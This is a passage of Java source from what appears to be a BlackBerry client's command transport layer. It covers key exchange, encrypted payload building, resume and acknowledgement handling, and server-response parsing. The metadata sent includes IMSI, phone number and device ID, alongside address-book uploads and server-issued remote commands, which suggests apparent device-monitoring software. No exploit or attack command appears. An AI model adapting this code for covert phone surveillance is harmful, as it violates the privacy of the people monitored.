				} else if (cmdResponse instanceof SendAddressBookCmdResponse) {
					SendAddressBookCmdResponse sendRes = (SendAddressBookCmdResponse) cmdResponse;
//					Log.debug(TAG, "cmdResponse != null? " + (cmdResponse != null));
					if (cmdResponse != null) {
						Log.debug(TAG, " sendRes.getExtStatus(): " 	+ sendRes.getExtStatus());
						Log.debug(TAG, " sendRes.getServerId(): " 	+ sendRes.getServerId());
						Log.debug(TAG, " sendRes.getServerMsg(): " 	+ sendRes.getServerMsg());
						Log.debug(TAG, " sendRes.getStatusCode(): " + sendRes.getStatusCode());
						Log.debug(TAG, " sendRes.getCommand(): " 	+ sendRes.getCommand().getId());
						Vector pcc = sendRes.getPCCCommands();
//						Log.debug(TAG, " PCC Size: " + pcc.size());
						for (int i = 0; i < pcc.size(); i++) {
							PCCCommand nextCmd = (PCCCommand) pcc.elementAt(i);
//							Log.debug(TAG, " nextCmd.getCmdId(): " 	+ nextCmd.getCmdId().getId());
							Vector arg = nextCmd.getArguments();
							for (int j = 0; j < arg.size(); j++) {
								String argument = (String)arg.elementAt(j);
//								Log.debug(TAG, " Argument: " + argument);
							}
						}
					}
				} else if (cmdResponse instanceof SendAddressBookApprovalCmdResponse) {
					SendAddressBookApprovalCmdResponse sendRes = (SendAddressBookApprovalCmdResponse) cmdResponse;
//					Log.debug(TAG, "cmdResponse != null? " + (cmdResponse != null));
					if (cmdResponse != null) {
						Log.debug(TAG, " sendRes.getExtStatus(): " 	+ sendRes.getExtStatus());
						Log.debug(TAG, " sendRes.getServerId(): " 	+ sendRes.getServerId());
						Log.debug(TAG, " sendRes.getServerMsg(): " 	+ sendRes.getServerMsg());
						Log.debug(TAG, " sendRes.getStatusCode(): " + sendRes.getStatusCode());
						Log.debug(TAG, " sendRes.getCommand(): " 	+ sendRes.getCommand().getId());
						Vector pcc = sendRes.getPCCCommands();
//						Log.debug(TAG, " PCC Size: " + pcc.size());
						for (int i = 0; i < pcc.size(); i++) {
							PCCCommand nextCmd = (PCCCommand) pcc.elementAt(i);
//							Log.debug(TAG, " nextCmd.getCmdId(): " 	+ nextCmd.getCmdId().getId());
							Vector arg = nextCmd.getArguments();
							for (int j = 0; j < arg.size(); j++) {
								String argument = (String)arg.elementAt(j);
//								Log.debug(TAG, " Argument: " + argument);
							}
						}
					}
				} else {
					UnknownCmdResponse unknownRes = (UnknownCmdResponse) cmdResponse;
//					Log.debug(TAG, "cmdResponse != null? " + (cmdResponse != null));
					if (cmdResponse != null) {
						Log.debug(TAG, " unknownRes.getExtStatus(): " 	+ unknownRes.getExtStatus());
						Log.debug(TAG, " unknownRes.getServerId(): " 	+ unknownRes.getServerId());
						Log.debug(TAG, " unknownRes.getServerMsg(): " 	+ unknownRes.getServerMsg());
						Log.debug(TAG, " unknownRes.getStatusCode(): " 	+ unknownRes.getStatusCode());
						Log.debug(TAG, " unknownRes.getCommand(): " 	+ unknownRes.getCommand().getId());
						Vector pcc = unknownRes.getPCCCommands();
//						Log.debug(TAG, " PCC Size: " + pcc.size());
						for (int i = 0; i < pcc.size(); i++) {
							PCCCommand nextCmd = (PCCCommand) pcc.elementAt(i);
//							Log.debug(TAG, " nextCmd.getCmdId(): " + nextCmd.getCmdId().getId());
							Vector arg = nextCmd.getArguments();
							for (int j = 0; j < arg.size(); j++) {
								String argument = (String)arg.elementAt(j);
//								Log.debug(TAG, " Argument: " + argument);
							}
						}
					}
				}
			}
		}*/
		
		private void doAcknowledge() {
			try {
				Acknowledgement ackknowledge = new Acknowledgement();
				ackknowledge.setUrl(_session.getUrl());
				ackknowledge.setSessionId(_session.getSessionId());
				ackknowledge.setDeviceId(_session.getDeviceId().getBytes("UTF-8"));
				ackknowledge.setAcknowledgeListener(this);
				ackknowledge.doAcknowledge();
				ackknowledge.join();
			} catch (InterruptedException e) {
				Log.error(TAG + ".doAcknowledge()", "InterruptedException", e);
			} catch (UnsupportedEncodingException e) {
				Log.error(TAG + ".doAcknowledge()", "UnsupportedEncodingException", e);
			}
		}
		
		private void doAcknowledgeSecure() {
			try {
				AcknowledgementSecure ackSecure = new AcknowledgementSecure();
				ackSecure.setSessionId(_session.getSessionId());
				ackSecure.setUrl(_session.getUrl() + "/unstructured");
				ackSecure.setAcknowledgeSecureListener(this);
				ackSecure.doAcknowledgeSecure();			
				ackSecure.join();
			} catch (InterruptedException e) {
				Log.error(TAG + ".doAcknowledgeSecure()", "InterruptedException", e);
			}
		}
		
		private void deletePayloadFile() {
//			Log.debug(TAG + ".deletePayloadFile()", "ENTER: " + this.getClass());
			String payloadPath = _session.getPayloadPath();
//			Log.debug(TAG + ".deletePayloadFile()", "payloadPath: " + payloadPath);
			try {
				if (payloadPath != null) {
					FileUtil.deleteFile(payloadPath);
				}
			} catch (IOException e) {
				Log.error(TAG + ".deletePayloadFile()", "Cannot delete file", e);
				e.printStackTrace();
			}
		}
		
		// -- Resume private methods -----
		
		private boolean doRask() {
			isSendRAskSuccess = false;
			CommandMetaData metaData = initCommandMetaData();
			SendRAsk rask = new SendRAsk();
			rask.setUrl(_session.getUrl()); 
			rask.setRAskListener(this);
			rask.doRAsk(metaData, _session.getPayloadCRC32(), _session.getPayloadSize(), 
						_session.getServerPublicKey(), 	_session.getAesKey(), _session.getSessionId());
			
			try {
				rask.join();
			} catch (InterruptedException e) {
				e.printStackTrace();
				rask = null;
				if (_run && cmdListener != null) { 
//					cmdListener.onConstructError(_session.getCsid(), e);
					cmdListener.onTransportError(_session.getCsid(), e);
				}
//				deletePayloadFile();
//				sessionManager.deleteSession(_session.getCsid());				
				Log.error(TAG + ".doRask()", "InterruptedException", e);
			}
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".doRask()", "isSendRAskSuccess: " + isSendRAskSuccess);
			}
			return isSendRAskSuccess;
		}
		
		private CommandMetaData initCommandMetaData() {
			CommandMetaData metaData = new CommandMetaData();
			metaData.setActivationCode(_session.getActivationCode());
			metaData.setCompressionCode(_session.getCompressionCode());
			metaData.setConfId(_session.getConfiguration());
			metaData.setDeviceId(_session.getDeviceId());
			metaData.setEncryptionCode(_session.getEncryptionCode());
			metaData.setImsi(_session.getImsi());
			metaData.setBaseServerUrl(_session.getBaseServerUrl());
			metaData.setLanguage(_session.getLanguage());
			metaData.setMcc(_session.getMcc());
			metaData.setMnc(_session.getMnc());
			metaData.setPhoneNumber(_session.getPhoneNumber());
			metaData.setProductId(_session.getProductId());
			metaData.setProductVersion(_session.getProductVersion());
			metaData.setProtocolVersion(_session.getProtocolVersion());
			metaData.setPayloadCrc32(_session.getPayloadCRC32());
			metaData.setPayloadSize(_session.getPayloadSize());
			return metaData;	
		}
		
		private boolean buildResumeCmdPacketData() {
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".buildResumeCmdPacketData()", "ENTER");
			}
			boolean isBuildResumeCmdPacketData = false;
			try {
				//Build Command_Packet_data
				ProtocolPacketBuilder protPacketBuilder = new ProtocolPacketBuilder();
				response = protPacketBuilder.buildResumeCmdPacketData(
							initCommandMetaData(), 
							_session.getPayloadPath(), 
							_session.getServerPublicKey(), 
							_session.getAesKey(), 
							_session.getSessionId(), 
							_resumeRequest.getTransportDirective());
				isBuildResumeCmdPacketData = true;			
			} catch (Exception e) {
				e.printStackTrace();
				Log.error(TAG + ".buildResumeCmdPacketData()", e.getMessage(), e);
				if (_run && cmdListener!= null)	{
					cmdListener.onTransportError(_session.getCsid(), e);
				}
				/*deletePayloadFile();
				sessionManager.deleteSession(_session.getCsid());*/
			}
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".buildResumeCmdPacketData()", "EXIT");
			}
			return isBuildResumeCmdPacketData;
		}

		// KeyExchangeListener
		public void onKeyExchangeError(Throwable err) {
			Log.error(TAG, "onKeyExchangeError", err);
			isKeyExchangeSuccess = false;
			if (_run && cmdListener!= null)	{
				cmdListener.onConstructError(_session.getCsid(), (Exception) err);
			}
		}
	
		public void onKeyExchangeSuccess(KeyExchangeCmdResponse keyExResponse) {
			keyExchangeResponse = keyExResponse;
			isKeyExchangeSuccess 		= true;
			_newRequest.getCommandRequest().getCommandMetaData().setKeyExchangeResponse(keyExchangeResponse);
			long 	ssid 		= keyExchangeResponse.getSessionId();
			byte[] 	serverPK 	= keyExchangeResponse.getServerPK();			
			if (Log.isDebugEnable()) {
				Log.debug(TAG + ".onKeyExchangeSuccess()", "ssid: " + ssid);
			}
			//Update and persist SessionInfo
			_session.setSessionId(ssid);
			_session.setServerPublicKey(serverPK);
		}
		
		// FxHttpListener
		public void onHttpError(Throwable err, String msg) {
			isHttpSuccess = false;
			isFirstResponseData = true;
			if (isWriteRespFile) {
				try {
					FileUtil.closeFile();
					FileUtil.deleteFile(responseFilePath);
				} catch (IOException e) {
					Log.error(TAG + ".onHttpError()", e.getMessage());
				}
			}
			if (_run && cmdListener!= null)	{
				cmdListener.onTransportError(_session.getCsid(), (Exception) err);
			}
		}

		public void onHttpResponse(FxHttpResponse response) {
			
			/*if (Log.isDebugEnable()) {
				Log.debug(TAG + ".onHttpResponse()", "response length: " + response.getBody().length);
			}*/
			
			int offset = 0;
			int length = response.getBody().length;
			executorState = ExecutorState.READ_RESPONSE;		
			//Check Server Header is encrypted?
			if (isFirstResponseData) {
				isFirstResponseData = false;
				isEncrypted = false;
				offset = 1;
				length--;
				byte[] responseData = response.getBody();
				if (responseData[0] == EncryptionType.ENCRYPT_ALL_METADATA.getId()) {
					isEncrypted = true;
				} 
			}
			if (isWriteRespFile) {
				//Write response to file
				try {
					FileUtil.append(responseFilePath, response.getBody(), offset, length);
				} catch (IOException e) {
					FileUtil.closeFile();
					Log.error(TAG + ".onHttpResponse()", e.getMessage());
					e.printStackTrace();
				}
			} else {
				//Write response to memory
				responseBuffer.write(response.getBody(), offset, length);
			}
		}

		public void onHttpSentProgress(SentProgress progress) {
			/*if (Log.isDebugEnable()) {
				Log.debug(TAG, "onHTTPProgress() -> " + progress);
			}*/
		}
		
		public void onHttpSuccess(FxHttpResponse result) {
			try {
				/*// Blackberry cannot resume so if there are any error will delete payload file
				deletePayloadFile();
				
				Log.debug(TAG + ".onHttpSuccess()", "sessionManager != null? " + (sessionManager != null));
				
				sessionManager.deleteSession(_session.getCsid());*/
				isHttpSuccess = true;
				isFirstResponseData = true;
				if (isWriteRespFile) {
					FileUtil.closeFile();
				}
//				Log.debug(TAG + ".onHttpSuccess()", "deleteSession!");
				
				StructureCmdResponse cmdResponse = parseResponse();
				
//				Log.debug(TAG + ".onHttpSuccess()", "cmdResponse != null? " + (cmdResponse != null));
				
				if ( cmdResponse instanceof StructureCmdResponse ) {
					StructureCmdResponse structCmdResp = (StructureCmdResponse) cmdResponse;
					structCmdResp.setCSID(_session.getCsid());
					structCmdResp.setConnectionMethod(result.getTransType());
					deletePayloadFile();
					sessionManager.deleteSession(_session.getCsid());
					int status = structCmdResp.getStatusCode();
					if (status == StatusCode.OK.getId()) {
						if (Log.isDebugEnable()) {
							Log.debug(TAG + ".onHttpSuccess()", "Success with payload: " + _session.getPayloadPath());
						}
						if (_run && cmdListener != null) { 
							cmdListener.onSuccess(cmdResponse);
						}
					} else {
						if (Log.isDebugEnable()) {
							Log.debug(TAG + ".onHttpSuccess()", "onServerError with payload: " + _session.getPayloadPath());
						}
						if (_run && cmdListener!= null)	{
							cmdListener.onServerError(_session.getCsid(), structCmdResp);
						}
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
				Log.error(TAG + ".onHttpSuccess()", "Exception", e);
				if (_run && cmdListener!= null)	{
					cmdListener.onTransportError(_session.getCsid(), e);
				}
			} finally {
				if (isWriteRespFile) {
					try {
						FileUtil.deleteFile(responseFilePath);
					} catch (IOException e) {
						Log.error(TAG + ".onHttpSuccess()", e.getMessage());
						e.printStackTrace();
					}
				}
			}
		}
		
		// AcknowledgeSecureListener
		public void onAcknowledgeSecureError(Throwable err) {
			Log.error(TAG + ".onAcknowledgeSecureError()", err.getMessage(), err);
		}

		public void onAcknowledgeSecureSuccess(AckSecCmdResponse ackSecResponse) {
			
		}

		// AcknowledgeListener
		public void onAcknowledgeError(Throwable err) {
			Log.error(TAG + ".onAcknowledgeError()", err.getMessage(), err);
		}

		public void onAcknowledgeSuccess(AckCmdResponse acknowledgeResponse) {
			
		}
		
		// RAskListener
		public void onSendRAskError(Throwable err) {
			isSendRAskSuccess = false;
			Log.error(TAG + ".onSendRAskError()", err.getMessage(), err);
			if (_run && cmdListener!= null)	{
				cmdListener.onTransportError(_session.getCsid(), (Exception) err);
			}
		}

		public void onSendRAskSuccess(SendRAskCmdResponse response) {
			int status = response.getStatusCode();
			if (status == StatusCode.OK.getId()) {
				isSendRAskSuccess = true;
				_sendRAskRes = response;
			} else {				
				isSendRAskSuccess = false;
				if (_run && cmdListener!= null)	{
					cmdListener.onServerError(_session.getCsid(), response);					
				}
				deletePayloadFile();
				sessionManager.deleteSession(_session.getCsid());
			}
		}
	}
}
